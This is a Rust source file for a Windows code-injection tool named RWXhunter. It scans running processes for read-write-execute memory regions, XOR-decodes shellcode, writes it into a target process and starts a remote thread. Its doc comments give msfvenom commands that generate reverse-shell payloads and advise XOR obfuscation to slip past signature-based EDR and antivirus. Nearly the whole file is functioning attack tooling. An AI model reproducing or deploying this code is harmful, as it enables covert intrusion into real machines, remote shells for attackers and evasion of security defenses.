mod safe_win32;

use std::error::Error;
use std::ffi::c_void;
use std::mem;
use std::ptr::null_mut;

use safe_win32::*;
use windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32;

use windows::Win32::System::Memory::{
    MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_PRIVATE, PAGE_EXECUTE_READWRITE,
};

#[allow(clippy::upper_case_acronyms)]
type LPVOID = *mut c_void;

///
/// Enumerating RWX Protected Memory Regions for Code Injection
///
///
/// Generate shellcode (example):
///
/// msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f num LHOST=<IP> LPORT=<PORT>
/// msfvenom -p windows/shell_reverse_tcp -a x86 -f num LHOST=<IP> LPORT=<PORT>
///
/// Obfuscate it with static xor key for signature based EDR/AV (example key: 0xC 0x3 0xFA 0x8 0x3)
/// <https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'0xC0x30xFA0x80x3'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)Find_/_Replace(%7B'option':'Simple%20string','string':','%7D,',%20',true,false,true,false)&oeol=FF>
///
/// Inspired by: <https://www.ired.team/offensive-security/defense-evasion/finding-all-rwx-protected-memory-regions>
///
/// # Examples
/// ```
/// let mut hunter = RWXhunter::new(vec![0], vec![0], vec![12, 3, 250, 8, 3].into(), API::Native);
/// while hunter.find_next_candidate().is_ok() {
///     if hunter.inject().is_ok() {
///         return Ok(());
///     }
/// }
///
///
pub enum API {
    Win,
    Native,
    Syscall,
}
pub struct RWXhunter {
    shellcode_x64: Vec<u8>,
    shellcode_x86: Vec<u8>,
    xor_key: Option<Vec<u8>>,
    snapshot: Option<windows::Win32::Foundation::HANDLE>,
    current_handle: Option<windows::Win32::Foundation::HANDLE>,
    process_entry: PROCESSENTRY32,
    mbi: MEMORY_BASIC_INFORMATION,
    api: API,
}

impl RWXhunter {
    /// Constructs a new, empty RWXhunter.
    pub fn new(
        shellcode_x64: Vec<u8>,
        shellcode_x86: Vec<u8>,
        xor_key: Option<Vec<u8>>,
        api: API,
    ) -> Self {
        let process_entry: PROCESSENTRY32 = PROCESSENTRY32 {
            dwSize: mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };
        RWXhunter {
            shellcode_x64,
            shellcode_x86,
            xor_key,
            snapshot: None,
            current_handle: None,
            process_entry,
            mbi: MEMORY_BASIC_INFORMATION::default(),
            api,
        }
    }
    #[allow(dead_code)]
    fn default() -> Self {
        RWXhunter::new(vec![], vec![], None, API::Win)
    }

    /// Searches for next suitable candidate which is suitable for code injection. Updates its state accordingly.
    /// Returns Error if no further candidate could be found.
    pub fn find_next_candidate(&mut self) -> Result<(), Box<dyn Error>> {
        let mut offset: LPVOID = null_mut();
        let snapshot = match self.snapshot {
            None => {
                let snapshot = create_toolhelp32_snapshot()?;
                self.snapshot = Some(snapshot);
                process32_first(snapshot, &mut self.process_entry)?;
                snapshot
            }
            Some(e) => e,
        };

        while process32_next(snapshot, &mut self.process_entry).is_ok() {
            if let Ok(process) = open_process(self.process_entry.th32ProcessID) {
                while virtual_query_ex(process, offset, &mut self.mbi) != 0 {
                    offset = self.mbi.BaseAddress.wrapping_add(self.mbi.RegionSize);
                    if self.mbi.AllocationProtect == PAGE_EXECUTE_READWRITE
                        && self.mbi.State == MEM_COMMIT
                        && self.mbi.Type == MEM_PRIVATE
                    {
                        self.current_handle = Some(process);
                        return Ok(());
                    }
                }
                offset = null_mut();
                close_handle(process)?;
            }
        }
        Err(Box::from("Could not find a suitable injection candidate."))
    }

    /// Detects the architecture for shellcode injection, de-obfuscates the shellcode, injects it into the correct location and creates a remote thread in the context of the process
    pub fn inject(&mut self) -> Result<(), Box<dyn Error>> {
        let process = self.current_handle.ok_or("No current handle.")?;
        let shellcode = match is_wow64_process(process)? {
            false => &mut self.shellcode_x64,
            true => &mut self.shellcode_x86,
        };

        //de-obfuscate
        if let Some(xor_key) = &self.xor_key {
            for (d, k) in shellcode.iter_mut().zip(xor_key.iter().cycle()) {
                *d ^= k;
            }
        }

        match self.api {
            API::Win => {
                write_process_memory(process, self.mbi, shellcode)?;
                create_remote_thread(process, self.mbi)?
            }
            API::Native => {
                nt_write_virtual_memory(process, self.mbi, shellcode)?;
                nt_create_thread_ex(process, self.mbi).unwrap()
            }
            API::Syscall => todo!(),
        };
        println!(
            "Injected to {} (PID: {}) at {:?}",
            query_full_process_image_name_a(process).unwrap_or("unknown".to_string()),
            self.process_entry.th32ProcessID,
            self.mbi.BaseAddress
        );
        close_handle(process)?;
        self.current_handle = None;
        Ok(())
    }
}
